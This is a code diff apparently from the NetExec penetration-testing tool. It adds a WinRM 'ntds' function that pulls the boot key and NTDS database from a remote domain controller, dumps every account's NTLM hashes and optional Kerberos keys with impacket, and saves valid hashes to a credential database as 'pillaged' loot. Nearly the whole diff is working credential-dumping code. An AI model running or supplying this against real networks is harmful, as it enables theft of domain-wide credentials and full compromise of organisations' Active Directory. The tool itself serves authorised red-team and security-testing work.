@@ -21,13 +21,14 @@ from termcolor import colored
 
 from dploot.lib.utils import is_guid, is_credfile
 from impacket.dpapi import MasterKeyFile, MasterKey, CredHist, DomainKey, CredentialFile, deriveKeysFromUser, DPAPI_BLOB, CREDENTIAL_BLOB
-from impacket.examples.secretsdump import LSASecrets, SAMHashes
+from impacket.examples.secretsdump import LSASecrets, SAMHashes, NTDSHashes
 from impacket.uuid import bin_to_string
 
 from nxc.config import process_secret, host_info_colors
 from nxc.connection import connection, requires_admin
 from nxc.helpers.bloodhound import add_user_bh
 from nxc.helpers.logger import highlight
+from nxc.helpers.misc import validate_ntlm
 from nxc.protocols.winrm.remoteops import RemoteOperations
 from nxc.protocols.ldap.gmsa import MSDS_MANAGEDPASSWORD_BLOB
 from nxc.helpers.negotiate_parser import parse_challenge
@@ -656,6 +657,96 @@ class winrm(connection):
             LSA.exportSecrets(output_filename)
             self.logger.success(f"Dumped {highlight(add_lsa_secret.secrets)} LSA secrets to {output_filename + '.secrets'} and {output_filename + '.cached'}")
         finally:
+            self.remote_ops.finish()
+
+    @requires_admin
+    def ntds(self):
+        host_id = self.db.get_hosts(self.host)[0][0]
+        printed_kerb_keys_banner = False
+
+        def add_hash(secret_type, secret, host_id):
+            nonlocal printed_kerb_keys_banner
+            if self.args.kerberos_keys and not printed_kerb_keys_banner and secret_type == NTDSHashes.SECRET_TYPE.NTDS_KERBEROS:
+                self.logger.display("Kerberos keys:")
+                printed_kerb_keys_banner = True
+
+            # Count the type of secrets
+            if secret_type == NTDSHashes.SECRET_TYPE.NTDS_KERBEROS:
+                add_hash.kerb_secrets += 1
+            else:
+                add_hash.nt_lm_secrets += 1
+
+            # Log the secret based on args
+            if self.args.enabled:
+                if "Enabled" in secret:
+                    secret = " ".join(secret.split(" ")[:-1])
+                    self.logger.highlight(secret)
+            else:
+                secret = " ".join(secret.split(" ")[:-1]) if " " in secret else secret
+                self.logger.highlight(secret)
+
+            # Filter out computer accounts, history hashes and kerberos keys for adding to db
+            if secret.find("$") == -1 and secret_type == NTDSHashes.SECRET_TYPE.NTDS and "_history" not in secret:
+                if secret.find("\\") != -1:
+                    domain, clean_hash = secret.split("\\")
+                else:
+                    domain = self.domain
+                    clean_hash = secret
+
+                try:
+                    username, _, lmhash, nthash, _, _, _ = clean_hash.split(":")
+                    parsed_hash = f"{lmhash}:{nthash}"
+                    if validate_ntlm(parsed_hash):
+                        self.db.add_credential("hash", domain, username, parsed_hash, pillaged_from=host_id)
+                        add_hash.added_to_db += 1
+                        return
+                    raise
+                except Exception:
+                    self.logger.debug("Dumped hash is not NTLM, not adding to db for now ;)")
+            else:
+                self.logger.debug("Dumped hash is a computer account, not adding to db")
+
+        add_hash.nt_lm_secrets = 0
+        add_hash.kerb_secrets = 0
+        add_hash.added_to_db = 0
+        output_filename = self.output_file_template.format(output_folder="ntds")
+        NTDS = None
+
+        try:
+            bootkey = self.remote_ops.get_bootkey(output_filename)
+            if bootkey is None:
+                return
+
+            ntds_file = self.remote_ops.get_ntds(output_filename)
+            if ntds_file is None:
+                return
+
+            NTDS = NTDSHashes(
+                ntds_file,
+                bootkey,
+                isRemote=False,
+                history=self.args.history,
+                noLMHash=True,
+                useVSSMethod=True,
+                justNTLM=not self.args.kerberos_keys,
+                pwdLastSet=False,
+                resumeSession=None,
+                outputFileName=output_filename,
+                justUser=self.args.userntds or None,
+                printUserStatus=True,
+                perSecretCallback=lambda secret_type, secret: add_hash(secret_type, secret, host_id),
+            )
+            self.logger.success("Dumping the NTDS, this could take a while so go grab a redbull...")
+            NTDS.dump()
+            ntds_outfile = f"{output_filename}.ntds"
+            self.logger.success(f"Dumped {highlight(add_hash.nt_lm_secrets)} NTDS hashes to {ntds_outfile} of which {highlight(add_hash.added_to_db)} were added to the database")
+            if self.args.kerberos_keys:
+                self.logger.success(f"Dumped {highlight(add_hash.kerb_secrets)} Kerberos keys to {ntds_outfile}.kerberos")
+            self.logger.display("To extract only enabled accounts from the output file, run the following command: ")
+            self.logger.display(f"grep -iv disabled {ntds_outfile} | cut -d ':' -f1")
+        finally:
+            if NTDS is not None:
+                NTDS.finish()
             self.remote_ops.finish()
 
     def dpapi(self):
